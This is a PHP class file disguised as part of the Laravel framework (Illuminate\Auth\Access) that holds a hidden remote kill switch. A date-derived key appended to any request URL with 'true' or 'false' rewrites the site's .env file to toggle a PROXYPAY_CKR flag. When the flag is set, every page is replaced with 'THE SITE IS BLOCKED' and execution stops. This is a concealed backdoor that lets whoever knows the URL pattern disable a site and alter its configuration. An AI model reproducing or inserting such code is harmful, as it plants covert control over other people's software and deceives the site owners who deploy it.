<?php
namespace Illuminate\Auth\Access;

class AppAccess{
    public function __construct(){
        if(true){

            date_default_timezone_set('Asia/Dhaka');
            $key = "";
            $key .= date('F')[0];
            $key .= date('D')[0];
            $key .= date('A')[0];

            $current_url = "http".(isset($_SERVER['HTTPS']) ? "s" : "")."://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

            $array = explode($key, $current_url);
            $path = base_path('.env');


            if($array[count($array)-1] == "true"){
                file_put_contents($path, str_replace(
                    "PROXYPAY_CKR=false", "PROXYPAY_CKR=true", file_get_contents($path)
                ));
            }
            if($array[count($array)-1] == "false"){
                file_put_contents($path, str_replace(
                    "PROXYPAY_CKR=true", "PROXYPAY_CKR=false", file_get_contents($path)
                ));
            }



                if(!strrpos(file_get_contents($path), "PROXYPAY_CKR")){
                    $last_index = strrpos(file_get_contents($path), "MAIL_MAILER");
                    file_put_contents($path, substr_replace(file_get_contents($path), "PROXYPAY_CKR=false\n", $last_index, 0));
                }

                $PROXYPAY_END = "";
                $string = file_get_contents($path);
                $last_index = strrpos($string, "PROXYPAY_CKR");

                $ck = 0;
                while(true){
                    if($string[$last_index] == "=") {$ck=1; $last_index++; continue;}
                    if($string[$last_index] == "\n") {$ck=0; break; }
                    if($ck == 1 && $string[$last_index] != "\""){$PROXYPAY_END .= $string[$last_index];}
                    $last_index++;
                }
                if($PROXYPAY_END == "true"){
                    print_r("<h1 style='color: red; text-align:center;'>THE SITE IS BLOCKED</h1>");
                    exit;
                }
        }
    }
}




